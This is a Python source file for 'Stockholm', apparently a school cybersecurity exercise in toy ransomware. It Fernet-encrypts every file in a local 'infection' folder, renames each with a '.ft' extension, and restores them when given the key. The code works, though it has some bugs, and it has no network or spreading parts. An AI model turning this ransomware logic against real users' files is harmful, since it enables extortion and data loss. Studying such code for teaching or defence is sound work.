#!/Volumes/sgoinfre/students/$USER/homebrew/bin/python3
import sys
from os import listdir, rename
from os.path import split
from cryptography.fernet import Fernet

folder="infection"

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    GREY = '\033[2m'
    CURSI = '\033[3m'
    UNDERLINE = '\033[4m'
    

def load_key():

    return open("key.key", "rb").read()

def encrypt_file(dst, k, silence):

    newfile = split(dst)
    if newfile[1].endswith('.ft'):
        with open(dst, 'rb') as o_file:
            r_file = o_file.read()
        crypt = k.encrypt(r_file)
        with open(dst, 'wb') as crypt_file:
            crypt_file.write(crypt)
    if silence == False:
        print(newfile[1], "encripted")

def decrypt_file(src, k, silence):

    newfile = split(src)
    if newfile[1].endswith('.ft'):
        name =  newfile[1]
        newname = name.replace('.ft', '')
        dst = folder + '/' + newname
        rename(src, dst)
        with open(dst, 'rb') as o_file:
            r_file = o_file.read()
        decrypt = k.decrypt(r_file)
        with open(dst, 'wb') as crypt_file:
            crypt_file.write(decrypt)
    if silence == False:
        print(name + " decriped as " + newname)

def switch_crypt(mode, src, k, silence):

    if mode == "rev":
        decrypt_file(src, k, silence)
    else:
        encrypt_file(src, k, silence)

def check_key(inputkey):

    with open("key.key", "r") as mykey:
            key = mykey.read()
    if not inputkey == key:
        return None
    else:
        return 1

def call_rev_files(key, silence):

    mode = "rev"
    if check_key(key) == 1:
        files_treat(mode, silence, key)
    else:
        print(bcolors.FAIL + "ERROR: Invalid syntax or incorrect key.")

def files_treat(mode, silence, key):
    
    folder = "infection"
    if key == "":
        with open("key.key", "rb") as mykey:
                key = mykey.read()
    k = Fernet(key)
    for count, filename in enumerate(listdir(folder)):
        modified_file = False
        src = folder + '/' + filename
        if not filename.endswith('.ft'):
            modified_file = True
            newname = filename + '.ft'
            dst = folder + '/' + newname
            rename(src, dst)
        if modified_file == True:
            switch_crypt(mode, dst, k, silence)
        else:
            switch_crypt(mode, src, k, silence)

def help_messages():

    print("\n* * * * * * * * * * * * * * * * * * * * * * * * * *\n")
    print("Stockholm encrypts local files from a specific folder.")
    print("\nThere exists flags to interact with the rogram:")
    print(bcolors.UNDERLINE + "\nFLAGS")
    print(bcolors.ENDC + "\t[ -help ][ -h ] Shows avaible flags for the program.")
    print("\t[ -reverse ][ -r ] Decrypt files using it along with decryption key [ ./stock.py -reverse + [key] ]")
    print("\t[ -silent ][ -s ] Silences the file de/encryption process. [./stock.py -silent] or " +
        "[./stock.py -silent -reverse + [key] ]")
    print("\t[ -version ][ -v ] Shows program version.")

def main(argv):

    key = ""
    mode = "crypt"
    
    if len(argv) > 4:
        print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Too many arguments. \nTry [ ./stock -help ]")
    elif len(argv) > 1:
        if argv[1] == "-help" or argv[1] == "-h":
            help_messages()
        elif argv[1] == "-version" or argv[1] == "-v":
            print( bcolors.CURSI + "\nStock(holm) version 1.0\nJuly 2022")
        elif argv[1] == "-silent" or argv[1] == "-s":
            if len(argv) == 2:
                files_treat(mode, True, key)
            elif len(argv) == 3:
                print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?")
            elif len(argv) == 4:
                call_rev_files(argv[3], True)
        elif argv[1] == "-reverse" or argv[1] == "-r":
            if len(argv) < 3:
                print ("Introducce the key [ -reverse + <key> ]")
            elif len(argv) == 4:
                print(bcolors.FAIL + "\n[ERROR]" + bcolors.ENDC + " Did you mean [ " + argv[0] + " -silent -reverse <key> ] ?")
            else:
                call_rev_files(argv[2], False)
    else:
        files_treat(mode, False, key)


if __name__ == '__main__':
    main(sys.argv)
